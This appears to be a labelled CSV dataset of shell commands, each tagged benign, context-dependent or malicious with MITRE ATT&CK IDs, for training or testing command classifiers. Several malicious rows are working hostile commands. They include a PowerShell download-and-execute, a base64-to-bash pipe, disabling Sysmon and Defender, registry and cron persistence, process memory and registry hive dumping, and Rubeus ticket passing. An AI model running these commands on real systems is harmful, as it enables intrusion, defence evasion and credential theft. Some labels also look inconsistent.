command,label,original_label,mitre_id
in-toto-sign [-f|--file] root.layout [-g|--gpg],Benign,Benign,Benign
find /home -name filename.txt,Context_Dependent,Benign,Benign
fltMC.exe unload SysmonDrv,Malicious,Malicious,T1562
neomutt -a path/to/file1 path/to/file2 ... -- recipient@example.com,Benign,Benign,Benign
ncspot [-c|--config] file_name,Benign,Benign,Benign
drush cr,Benign,Benign,Benign
"date -d ""yesterday 13:00"" '+%Y-%m-%d'",Benign,Benign,Benign
"pbmtextps -font Times-Roman -fontsize 30 ""Hello World!"" > path/to/output.pbm",Benign,Benign,Benign
keytool -storepasswd -keystore path/to/file.keystore,Benign,Benign,Benign
spctl --master-enable,Benign,Benign,Benign
df -hT,Context_Dependent,Synthetic,Synthetic
"echo ""5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
tldr todo,Benign,Benign,Benign
flow coverage --color path/to/file.jsx,Benign,Benign,Benign
k3d cluster delete cluster_name,Benign,Benign,Benign
openocd [-f|--file] config_file1.cfg [-f|--file] config_file2.cfg,Benign,Benign,Benign
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",Malicious,Malicious,T1564
o path/to/file,Benign,Benign,Benign
hash -r,Benign,Benign,Benign
expect -i,Benign,Benign,Benign
yes yes | sed -e 5s/yes/no/ -e 5q,Benign,Benign,Benign
update-ca-trust,Malicious,Malicious,T1553
python -m pygbag path/to/project_folder,Benign,Benign,Benign
git p4 sync path/to/p4_depot,Benign,Benign,Benign
wait4x http https://example.com/health --expect-status-code 200,Benign,Benign,Benign
sftp host,Benign,Benign,Benign
sudo iotop [-p|--pid] PID,Benign,Benign,Benign
ibmcloud login --sso,Benign,Benign,Benign
tldr [-p|--platform] common ping,Benign,Benign,Benign
nix-env [-iA|--install --attr] nixpkgs.pkg_name,Benign,Benign,Benign
find . \( -name '*.bak' -o -name *.backup \) -type f -atime +30 -exec rm '{}' ';',Benign,Benign,Benign
oldchecks -noninteractive -consoleoutput,Context_Dependent,Malicious,T1082
"find -type f -printf '""%p""",Benign,Benign,Benign
dirb https://example.org,Benign,Benign,Benign
sudo nala upgrade,Benign,Benign,Benign
darwin-rebuild switch --flake path/to/flake,Benign,Benign,Benign
grub-file --is-x86_64-xnu path/to/file,Benign,Benign,Benign
csh -f,Benign,Benign,Benign
"if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi",Context_Dependent,Malicious,T1082
split -n 1000000 /etc/gconf/schemas/gnome-terminal.schemas,Benign,Benign,Benign
sfdk qmltypes,Benign,Benign,Benign
git switch [-d|--detach] tag|commit,Benign,Benign,Benign
bzip2 file | tee -a logfile,Benign,Benign,Benign
Get-GPPPassword -Verbose,Malicious,Malicious,T1552
"comby 'assert_eq!(:[a], :[b])' 'assert_eq!(:[b], :[a])' .rs",Benign,Benign,Benign
clip-view path/to/page1.clip path/to/page2.clip ...,Benign,Benign,Benign
xmake [b|build] [r|run],Benign,Benign,Benign
firewall-cmd --reload,Benign,Benign,Benign
tlsx [-u|-host] host [-ve|-version-enum] [-ce|-cipher-enum],Benign,Benign,Benign
ufile.io,Malicious,Malicious,T1570
khal calendar,Benign,Benign,Benign
find / ! -newer /tmp/timestamp -exec touch {} \;,Context_Dependent,Benign,Benign
jcal,Benign,Benign,Benign
SecurityCenter2.AntiVirusProduct,Context_Dependent,Malicious,T1518
"find . -type f -iname ""*.flac"" -o -print0 -iname ""*.mp3"" -print0 -o -iname ""*.wav"" -print0 -o -iname ""*.aac"" -print0 -o -iname ""*.wma"" -print0 | while read -d $'\0' file; do cp -ruv ""$file"" ""/media/wd/network_sync/music/$file""; done",Benign,Benign,Benign
rustup doc,Benign,Benign,Benign
"feroxbuster --url ""https://example.com"" --filter-status 301 --filter-size 4092",Benign,Benign,Benign
bun [c|create] template path/to/destination --no-install,Benign,Benign,Benign
"Remove-Item -WhatIf path\to\file1 , path\to\file2 ...",Benign,Benign,Benign
gst-launch-1.0 source ! videoconvert ! sink,Benign,Benign,Benign
cat ~/.bashrc | pbcopy,Benign,Benign,Benign
systemctl whoami --user,Benign,Benign,Benign
gpu-screen-recorder --list-audio-devices|--list-application-audio,Benign,Benign,Benign
shopt -u compat31,Benign,Benign,Benign
apptainer test [-C|--containall] path/to/image.sif,Benign,Benign,Benign
sudo dd if=/dev/zero bs=1000 count=5 of=$system_log_path #log file filled with null bytes(zeros),Malicious,Malicious,T1070
pct [cr|create] 100 local:vztmpl/distro-name.tar.zst --rootfs local-lvm:4 --start,Benign,Benign,Benign
sudo delpart /dev/sda 1,Benign,Benign,Benign
command -v wget,Context_Dependent,Synthetic,Synthetic
mid3v2 --year=YYYY path/to/file1.mp3 path/to/file2.mp3 ...,Benign,Benign,Benign
watch [-g|--chgexit] lsblk,Benign,Benign,Benign
ulimit -a,Benign,Benign,Benign
echo Hello world | od -t x1 -t c,Benign,Benign,Benign
find ~/mydir -iname '*.htm' -exec rm {} \;,Benign,Benign,Benign
join <(sort -n file1) <(sort -n file2),Benign,Benign,Benign
etcd,Benign,Benign,Benign
find -maxdepth 2 -name file1,Benign,Benign,Benign
fileicon set path/to/file_or_directory path/to/icon_file.png,Benign,Benign,Benign
stack new package template,Benign,Benign,Benign
lnav -C path/to/log_directory,Benign,Benign,Benign
ipinfo grepip path/to/file.txt,Benign,Benign,Benign
deno init sample && cd sample && deno test,Benign,Benign,Benign
certutil -K -d . -f path/to/password_file.txt,Benign,Benign,Benign
loadkeys [-b|--bkeymap] en|de|fi|...,Benign,Benign,Benign
pkcon install package,Benign,Benign,Benign
spectacle,Benign,Benign,Benign
snap refresh package,Benign,Benign,Benign
git blame -L 123 path/to/file,Benign,Benign,Benign
wasm-opt -Oz input.wasm [-o|--output] output.wasm,Benign,Benign,Benign
brew search --cask keyword,Benign,Benign,Benign
"gendesk -n --name ""app"" --exec ""/path/to/app"" --icon ""/path/to/icon.png"" --comment ""This is application""",Benign,Benign,Benign
net time \\$computer_name,Malicious,Malicious,T1124
"{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);",Malicious,Malicious,T1573
toolbox list,Benign,Benign,Benign
gcrane completion bash > /etc/bash_completion.d/gcrane,Benign,Benign,Benign
mklink /d path\to\link_file path\to\source_directory,Benign,Benign,Benign
bun pm version,Benign,Benign,Benign
play path/to/audio_file speed 2.0,Benign,Benign,Benign
sw_vers -buildVersion,Benign,Benign,Benign
bosh [-e|--environment] environment vms [-d|--deployment] deployment,Benign,Benign,Benign
gcloud compute instances list,Benign,Benign,Benign
e2image /dev/sdXN path/to/image_file,Benign,Benign,Benign
Enable-PnpDevice -InstanceId 'RETRIEVED USING Get-PnpDevice COMMAND',Benign,Benign,Benign
tmux show-environment -t sessname | grep RBENV,Benign,Benign,Benign
cipher /d:path\to\file_or_directory,Benign,Benign,Benign
"Write-Host ""Process Name: $processName)""",Malicious,Malicious,T1562
ots new -x number_of_hoursh,Benign,Benign,Benign
doctl [d|databases] [r|replica] [g|get] database_id replica_name,Benign,Benign,Benign
Program Files(x86),Malicious,Malicious,T1485
pnmscalefixed [-w|-width] width path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
qm [shu|shutdown] --timeout 10 VM_ID,Benign,Benign,Benign
ng [b|build] --clear-screen,Benign,Benign,Benign
radeontop [-t|--ticks] samples_per_second,Benign,Benign,Benign
ranger --datadir path/to/directory,Benign,Benign,Benign
vagrant destroy [-g|--graceful],Benign,Benign,Benign
cat xx01,Context_Dependent,Malicious,T1005
pip uninstall [-y|--yes] package,Benign,Benign,Benign
find ./ -type f -exec rm -rf {} \;,Benign,Benign,Benign
ppmdither [-r|-red] 2 [-g|-green] 3 [-b|-blue] 2 path/to/image.ppm > path/to/file.ppm,Benign,Benign,Benign
split -a4 -d -l100000 hugefile.txt part.,Benign,Benign,Benign
rpm -qa | wc -l,Context_Dependent,Synthetic,Synthetic
cpufreq-info,Benign,Benign,Benign
cluster -o output.gv input.gv,Benign,Benign,Benign
getST.py -hashes LM_Hash:NT_Hash domain/username -spn service/target,Benign,Benign,Benign
phpstorm path/to/file,Benign,Benign,Benign
pandoc path/to/input.md [-o|--output] path/to/output.pdf,Benign,Benign,Benign
udiskie-umount --eject path/to/mount,Benign,Benign,Benign
papermc stop,Benign,Benign,Benign
sqlite3,Benign,Benign,Benign
keyctl add type_keyring key_name key_value target_keyring,Benign,Benign,Benign
tldr factor,Benign,Benign,Benign
ispell path/to/file,Benign,Benign,Benign
sfdk undeploy --method [-n|--dry-run],Benign,Benign,Benign
cb info,Benign,Benign,Benign
join -j2 <(sort -k2 file1) <(sort -k2 file2),Benign,Benign,Benign
"dd if=/proc/""${PID}""/mem of=""$output_file"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""",Malicious,Malicious,T1003
gcc -x c /dev/null -o /path/to/input-file,Malicious,Malicious,T1222
reload,Benign,Benign,Benign
dracut --kver kernel_version,Benign,Benign,Benign
zbarcam --nodisplay,Benign,Benign,Benign
find . -type f -print0 | xargs -0 ls -ltr | tail -n 1,Benign,Benign,Benign
find ${INPUT_LOCATION} -name '*.pdf.marker' -exec sh -c 'mv $0 `dirname $0`/`basename $0 .marker` $1' {} ${OUTPUT_LOCATION} \;,Benign,Benign,Benign
"find . -name ""file-containing-can't"" -exec grep ""can't"" '{}' \; -print",Benign,Benign,Benign
find file -prune -cmin +60 -print | grep -q .,Benign,Benign,Benign
sudo hostapd path/to/hostapd.conf,Benign,Benign,Benign
salt-call state.highstate,Benign,Benign,Benign
"exiftool ""-description<=/path/to/input-file --filename /path/to/output-file",Malicious,Malicious,T1222
qm [di|disk] [i|import] vm_id path/to/disk storage_name --format qcow2|raw|vmdk,Benign,Benign,Benign
docker login [-u|--username] username,Benign,Benign,Benign
az logout,Benign,Benign,Benign
mpicc -o executable path/to/object_file.o,Benign,Benign,Benign
gemtopnm -version,Benign,Benign,Benign
irssi [-?|--help],Benign,Benign,Benign
aws s3 mv path/to/local_file s3://bucket_name/path/to/remote_file,Benign,Benign,Benign
fio --filename=path/to/file --direct=1 --rw=randread --bs=4k --ioengine=libaio --iodepth=256 --runtime=120 --numjobs=4 --time_based --group_reporting --name=job_name --eta-newline=1 --readonly,Benign,Benign,Benign
find -L /target -type l | while read -r file; do echo $file is orphaned; done,Benign,Benign,Benign
find /path/to/dir -type f -exec chmod 644 {} +,Benign,Benign,Benign
light-arionum-cli transaction transaction_id,Benign,Benign,Benign
docker [cp|container cp] path/to/file_or_directory_on_host container_name:path/to/file_or_directory_in_container,Benign,Benign,Benign
tldr pamdepth,Benign,Benign,Benign
skaffold dev [-f|--filename] skaffold.yaml,Benign,Benign,Benign
npm profile set password,Benign,Benign,Benign
ansible group [-m|--module-name] setup,Benign,Benign,Benign
"find / -name ""*fink*"" -print",Context_Dependent,Benign,Benign
whereis wget,Context_Dependent,Synthetic,Synthetic
module load module_name,Benign,Benign,Benign
run-mailcap --action=view|cat|compose|composetyped|edit|print path/to/file,Benign,Benign,Benign
screen -dmS title executable,Benign,Benign,Benign
autoexpect command,Benign,Benign,Benign
0 3534848 linear /dev/loop0 94208,Malicious,Malicious,T1059
patch < patch.diff [-R|--reverse],Benign,Benign,Benign
pacrepairdb --help,Benign,Benign,Benign
gita group add [-n|--name] group_name repo1 repo2 ... && gita context group_name,Benign,Benign,Benign
cli53 [rc|rrcreate] example.com 'www 300 A 150.130.110.1',Benign,Benign,Benign
spark register token,Benign,Benign,Benign
id3v2 [-v|--version],Benign,Benign,Benign
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\ICM\Calibration,Malicious,Malicious,T1548
ddgr [-w|--site] site keyword,Benign,Benign,Benign
sudo mount.steamos /dev/sdX /mnt,Benign,Benign,Benign
"echo ""luke;yoda;leila"" | tr "";"" ""\n""",Benign,Benign,Benign
"echo ""[Timer]"" >> $path_to_systemd_timer",Malicious,Malicious,T1053
rspamc symbols path/to/email_file,Benign,Benign,Benign
"medusa -M HTTP -h host -u username -p password -m USER-AGENT:""Agent""",Benign,Benign,Benign
sudo log collect --last 1h --output path/to/file.logarchive,Benign,Benign,Benign
dcgmi group [-l|--list],Benign,Benign,Benign
mdutil -s /,Benign,Benign,Benign
zotero,Benign,Benign,Benign
kitex -type protobuf path/to/IDL_file.proto,Benign,Benign,Benign
aws cloud9 delete-environment-membership --environment-id environment_id --user-arn user_arn,Benign,Benign,Benign
pixi clean,Benign,Benign,Benign
find . -type f -mtime +7 -mtime -14 | xargs tar -cvf `date ‘+%d%m%Y’_archive.tar`,Benign,Benign,Benign
python path/to/file.py,Benign,Benign,Benign
tar -I pbzip2 -cf OUTPUT_FILE.tar.bz2 /DIR_TO_ZIP/,Benign,Benign,Benign
find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f,Benign,Benign,Benign
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1'),Malicious,Malicious,T1106
sudo pacman -S package=version,Benign,Benign,Benign
lshw -short,Context_Dependent,Synthetic,Synthetic
sudo mknod [-Z|--context] path/to/device_file type major_device_number minor_device_number,Benign,Benign,Benign
stormlock acquire resource,Benign,Benign,Benign
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",Malicious,Malicious,T1546
curl https://example.com,Benign,Benign,Benign
malloc,Malicious,Malicious,T1055
csslint file.css,Benign,Benign,Benign
mysqld --verbose --help,Benign,Benign,Benign
"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\$app_name"" /t REG_SZ /d $new_path /f",Malicious,Malicious,T1112
ipscan 192.168.0.1-254 -o path/to/output.txt,Benign,Benign,Benign
satis build --repository-url repository_url satis.json path/to/output_directory,Benign,Benign,Benign
cs setup,Benign,Benign,Benign
bluetoothctl devices,Benign,Benign,Benign
authconfig --update --enablenis,Benign,Benign,Benign
compseq -sequence path/to/input_rna.fasta -word 3 path/to/output_file.comp -nozero -frame 1,Benign,Benign,Benign
snapper [-c|--config] config delete snapshot_number,Benign,Benign,Benign
pw-cli [h|help],Benign,Benign,Benign
jhead path/to/image.jpg,Benign,Benign,Benign
sudo bcachefs data rereplicate path/to/mountpoint,Benign,Benign,Benign
conda env update [-f|--file] path/to/file --prune,Benign,Benign,Benign
"Set-Location ""PathToAtomicsFolder""",Malicious,Malicious,T1071
pipetron [-vd|--volume-daemon],Benign,Benign,Benign
"gh search issues -- ""search_query -label:label_name""",Benign,Benign,Benign
daps [-d|--docconfig] path/to/file.xml pdf,Benign,Benign,Benign
tty-clock -C color_number,Benign,Benign,Benign
lldb executable,Benign,Benign,Benign
sudo btrfs [i|inspect-internal] [i|inode-resolve] n path/to/btrfs_mount,Benign,Benign,Benign
"sort -u -t, -k1,1 file",Benign,Benign,Benign
find . | sort -f | uniq -i -d,Benign,Benign,Benign
sudo apptainer config global [-u|--unset] directive value,Benign,Benign,Benign
qwen,Benign,Benign,Benign
kiterunner wordlist list [-o|--output] json,Benign,Benign,Benign
auracle search 'regex',Benign,Benign,Benign
sudo deluser username,Benign,Benign,Benign
whoami /upn,Context_Dependent,Benign,Benign
rpcmap.py -brute-opnums stringbinding,Benign,Benign,Benign
find . -type d -maxdepth 1 -empty -print0 | xargs -0 /bin/rmdir,Benign,Benign,Benign
systemctl halt --when +2h,Benign,Benign,Benign
find . -type d -name 'test' -exec rm -rf {} \;,Benign,Benign,Benign
service service_name status,Benign,Benign,Benign
"finger -s | awk '{printf(""%s %s\n"", $1, $2);}'",Context_Dependent,Benign,Benign
"Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",Malicious,Malicious,T1574
kaggle [c|competitions] download competition_name,Benign,Benign,Benign
gnome-calculator,Benign,Benign,Benign
NSXPCConnection API,Malicious,Malicious,T1559
mongodump [-o|--out] path/to/directory,Benign,Benign,Benign
depotdownloader -app 108600 -pubfile 2503622437,Benign,Benign,Benign
echo too many secrets > $folder_name\$hidden_filename,Malicious,Malicious,T1564
echo End of Golden Ticket attack,Malicious,Malicious,T1558
"find ""$1"" -type f | egrep -v '\.bz2' | xargs bzip2 -9 &",Benign,Benign,Benign
lsappinfo info com.apple.calculator,Benign,Benign,Benign
ImpersonateNamedPipeClient,Malicious,Malicious,T1134
InstallUtil.exe {REMOTEURL},Malicious,Malicious,T1105
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v Debugger /d ""$payload_binary""",Malicious,Malicious,T1546
md5 path/to/file,Benign,Benign,Benign
git undo,Benign,Benign,Benign
git reflog [-n|--max-count] 5,Benign,Benign,Benign
find /home -size +10M -size -50M,Context_Dependent,Benign,Benign
poetry add package_name==version,Benign,Benign,Benign
sudo deluser --remove-all-files username,Benign,Benign,Benign
asdf current name,Benign,Benign,Benign
find . -type d -depth,Benign,Benign,Benign
ptrace,Context_Dependent,Malicious,T1622
picard path/to/file1.mp3 path/to/file2.mp3 ...,Benign,Benign,Benign
pamtowinicon path/to/input_file.pam > path/to/output.ico,Benign,Benign,Benign
docker network inspect network_name1 network_name2 ...,Benign,Benign,Benign
toilet input_text [-f|--font] font_filename,Benign,Benign,Benign
"chatgpt [-p|--prompt] ""What is the regex to match an email address?""",Benign,Benign,Benign
vue serve filename,Benign,Benign,Benign
fprintd-verify,Benign,Benign,Benign
systemctl cancel job_id,Benign,Benign,Benign
zdb [-C|--config] poolname,Benign,Benign,Benign
zsh path/to/script.zsh,Benign,Benign,Benign
pabcnetcclear /Debug:0|1 path\to\source_file.pas,Benign,Benign,Benign
flashrom [-p|--programmer] linux_spi:dev=/dev/spidev0.0,Benign,Benign,Benign
uv export --no-hashes,Benign,Benign,Benign
slim build image:tag,Benign,Benign,Benign
systemctl reset-failed,Benign,Benign,Benign
uwfmgr filter enable|disable,Benign,Benign,Benign
pyenv install 2.7.10,Benign,Benign,Benign
phploc path/to/directory,Benign,Benign,Benign
Evil.txt.exe,Malicious,Malicious,T1036
"hashcat [-m|--hash-type] hash_type_id [-a|--attack-mode] 3 --increment hash_value ""?a?a?a?a?a?a?a?a""",Benign,Benign,Benign
picotool reboot,Benign,Benign,Benign
npm [v|view] package versions,Benign,Benign,Benign
iwconfig,Benign,Benign,Benign
bacon,Benign,Benign,Benign
iam.serviceAccountUser,Malicious,Malicious,T1548
sg run --pattern 'useState<number>($A)' --rewrite 'useState($A)' --lang typescript,Benign,Benign,Benign
hg add [-X|--exclude] pattern,Benign,Benign,Benign
vagrant status name|id,Benign,Benign,Benign
warp-diag,Benign,Benign,Benign
"xprop -font ""font_name"" POINT_SIZE",Benign,Benign,Benign
wasm-objdump [-d|--disassemble] file.wasm,Benign,Benign,Benign
cfv -Czvl -p path/to/directory,Benign,Benign,Benign
poetry list namespace,Benign,Benign,Benign
redis-cli -u uri,Benign,Benign,Benign
su username,Benign,Benign,Benign
echo $sh_encoded | base64 -d | bash,Malicious,Malicious,T1140
C:\Users\Public\WinSrcNT\It11.exe,Context_Dependent,Malicious,T1005
pygbag path/to/project_folder --no_opt,Benign,Benign,Benign
pokego --name blastoise --form mega,Benign,Benign,Benign
git verify-commit commit_hash1 optional_commit_hash2 ... --raw,Benign,Benign,Benign
ansible-doc [-s|--snippet] plugin_name,Benign,Benign,Benign
sudo update-ca-certificates,Benign,Benign,Benign
tar -czf backup.tar.gz -X /path/to/exclude.txt /path/to/backup,Benign,Benign,Benign
git status [-sb|--short --branch],Benign,Benign,Benign
find /usr/src -name '*.c' -size +100k -print,Benign,Benign,Benign
dconf read /path/to/key,Benign,Benign,Benign
VBoxManage controlvm uuid|vm_name resume,Benign,Benign,Benign
"echo ""url=http://example.com"" | git credential reject",Benign,Benign,Benign
"find dir_to_start -not -name ""file_to_exclude"" -print0 | xargs -0 chown owner",Benign,Benign,Benign
od -t x1 -An /bin/ls | head,Benign,Benign,Benign
sudo blkid,Benign,Benign,Benign
find . -name RAID -prune -o -print,Benign,Benign,Benign
go build -o executable file.go,Benign,Benign,Benign
dockutil --remove 'dock_item_label',Benign,Benign,Benign
conda install [-c|--channel] conda-forge --override-channels package,Benign,Benign,Benign
tofu output,Benign,Benign,Benign
"Write-Host ""Extraction completed."" -ForegroundColor Green",Malicious,Malicious,T1562
qemu-system-x86_64 [-M|-machine] help,Benign,Benign,Benign
"topydo add ""(A) todo _message due:1d""",Benign,Benign,Benign
cewl --auth_type basic|digest --auth_user username --auth_pass password url,Benign,Benign,Benign
"for /L %a in (1,1,$limit) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\$target_hive"" %temp%\$target_hivevss%a 2 >nul 2>&1) & dir /B %temp%\$target_hivevss*",Malicious,Malicious,T1003
secretsdump.py -no-pass domain/username@target,Benign,Benign,Benign
b2 create_bucket bucket_name allPublic|allPrivate,Benign,Benign,Benign
sf force:org:list,Benign,Benign,Benign
pr [-m|--merge] [-T|--omit-pagination] path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 1",Malicious,Malicious,T1562
find . -name a\*.html,Benign,Benign,Benign
systemd-sysext,Benign,Benign,Benign
loc,Benign,Benign,Benign
slimrb --erb input.slim output.erb,Benign,Benign,Benign
npm exec /bin/sh,Malicious,Malicious,T1059
emond,Benign,Benign,Benign
caffeine,Benign,Benign,Benign
oauth2c issuer_url --client-id client_id --pkce,Benign,Benign,Benign
"rundll32.exe -sta ""AtomicTest""",Malicious,Malicious,T1546
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgs /service:cifs/$target /ticket:ticket.kirbi /ptt",Malicious,Malicious,T1550
dolphin --new-window,Benign,Benign,Benign
npm explore package_name,Benign,Benign,Benign
pants list ::,Benign,Benign,Benign
tcpdump -i ens33 port 80,Context_Dependent,Synthetic,Synthetic
toybox --version,Benign,Benign,Benign
pecl,Benign,Benign,Benign
yes 1 | script -c 'aspell check text.txt' /dev/null,Benign,Benign,Benign
"find . -type f -name ""*.*"" | grep -o -E ""\.[^\.]+$"" | grep -o -E ""[[:alpha:]]{3,6}"" | awk '{print tolower($0)}' | sort | uniq -c | sort -rn",Benign,Benign,Benign
copy /-y path\to\source_file path\to\target_file,Benign,Benign,Benign
ls -lR / | tee output.file,Benign,Benign,Benign
sslscan example.com:465,Benign,Benign,Benign
tunnel download table_name path/to/file;,Benign,Benign,Benign
uname -s -r -v,Context_Dependent,Benign,Benign
mongod --config path/to/file,Benign,Benign,Benign
bun [a|add] package,Benign,Benign,Benign
devenv up --config path/to/file,Benign,Benign,Benign
zeroclaw channel start,Benign,Benign,Benign
chronyc makestep,Benign,Benign,Benign
sudo yum --releasever=2013.09 update openssl,Benign,Benign,Benign
vagrant reload --provision,Benign,Benign,Benign
who am i,Context_Dependent,Synthetic,Synthetic
net.exe users,Context_Dependent,Malicious,T1087
setfattr [-n|--name] user.attribute_name path/to/file,Benign,Benign,Benign
ls -lt | tr -d 0-9,Benign,Benign,Benign
live-server,Benign,Benign,Benign
cwebp path/to/image_file -o path/to/output.webp -resize width height,Benign,Benign,Benign
scan-build,Benign,Benign,Benign
pastel distinct n,Benign,Benign,Benign
"rundll32.exe zipfldr.dll,RouteTheCall ""$exe_to_launch""",Malicious,Malicious,T1218
mpd,Benign,Benign,Benign
pg_checksums [-v|--verbose] [-D|--pgdata] path/to/data,Benign,Benign,Benign
ibmcloud target --unset-region,Benign,Benign,Benign
namei [-m|--modes] path/to/a path/to/b path/to/c,Benign,Benign,Benign
help \(,Benign,Benign,Benign
kpackagetool6 [-t|--type] package_type [-u|--upgrade] path/to/directory,Benign,Benign,Benign
sudo pacman-key --populate,Benign,Benign,Benign
( awk 'NR % 2' input; awk 'NR % 2 == 0' input ) | paste - - - | column -s' ' -t,Benign,Benign,Benign
ldd [-u|--unused] path/to/binary,Benign,Benign,Benign
"cat $(find src/js -type f -name ""*.js"" -printf ""%d\t%p\n"" | sort -n | sed -e ""s|[0-9]*\t||"")>min.js",Benign,Benign,Benign
which scp,Context_Dependent,Synthetic,Synthetic
mypy [--tb|--show-traceback] path/to/file_or_directory,Benign,Benign,Benign
kscreen-doctor [-o|--outputs],Benign,Benign,Benign
task add description due:tomorrow,Benign,Benign,Benign
pmset -g batt,Benign,Benign,Benign
find /path ! -perm /022,Benign,Benign,Benign
lvmpolld [-t|--timeout] 300,Benign,Benign,Benign
nixpkgs-review wip --staged,Benign,Benign,Benign
xmount --in raw path/to/image.dd --out dmg mountpoint,Benign,Benign,Benign
"Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""$target_user""",Malicious,Malicious,T1098
"date ; read -t 10 -p ""Hit ENTER or wait ten seconds"" ; echo ; date",Benign,Benign,Benign
"find . -name ""*.fq"" -print0 | xargs -0 -n 1 fastqc",Benign,Benign,Benign
nmap --script=default 192.168.1.100,Context_Dependent,Synthetic,Synthetic
df --total,Benign,Benign,Benign
aws ses describe-active-receipt-rule-set --generate-cli-skeleton,Benign,Benign,Benign
opencode stats,Benign,Benign,Benign
buzzphrase,Benign,Benign,Benign
dig target.com,Context_Dependent,Synthetic,Synthetic
virt-manager --show-host-summary,Benign,Benign,Benign
"find . -type f -name ""*cache.html"" -exec sh -c ""gzip < {} > {}.gz"" \;",Benign,Benign,Benign
sfdk config name=value,Benign,Benign,Benign
html5validator --root path/to/directory,Benign,Benign,Benign
glib-compile-resources file.gresource.xml,Benign,Benign,Benign
"echo ""<line>"" | cut -d "";"" -f 1",Benign,Benign,Benign
zapier versions [-a|--all],Benign,Benign,Benign
"echo ""$command"" > /etc/cron.d/$cron_script_name",Malicious,Malicious,T1053
snmpbulkget -v version -c community -O f ip_address oid,Benign,Benign,Benign
$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug,Malicious,Malicious,T1055
lambo new [-p|--path] path/to/directory app_name,Benign,Benign,Benign
adb connect ip_address:port,Benign,Benign,Benign
sudo badblocks -o path/to/file -w /dev/sdX,Benign,Benign,Benign
paccapability --version,Benign,Benign,Benign
hg update [-r|--rev] revision,Benign,Benign,Benign
speed-test --verbose,Benign,Benign,Benign
kmutil inspect options,Benign,Benign,Benign
find . -type f -name \*,Benign,Benign,Benign
ipconfig /release adapter,Benign,Benign,Benign
"cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""",Malicious,Malicious,T1547
terminal-notifier -message 'Imported 42 contacts.' -activate com.apple.AddressBook,Benign,Benign,Benign
standard-version --dry-run,Benign,Benign,Benign
raw [-qa|--query --all],Benign,Benign,Benign
crane auth [-h|--help],Benign,Benign,Benign
mupdf -r 72 path/to/file,Benign,Benign,Benign
"find data/ -name ""filepattern-*2009*"" | cpio -ov --format=ustar > 2009.tar",Benign,Benign,Benign
mp4decrypt --key track_id:key_hex path/to/input_file.mp4 path/to/output_file.mp4,Benign,Benign,Benign
latte-dock --clear-cache,Benign,Benign,Benign
sudo arptables [-A|--append] INPUT [-s|--source-ip] 192.168.0.1 [-j|--jump] DROP,Benign,Benign,Benign
"find . -name ""*.txt"" -prune -o -print",Benign,Benign,Benign
ldifde.exe -f $output_path\$output_file -p subtree,Context_Dependent,Malicious,T1069
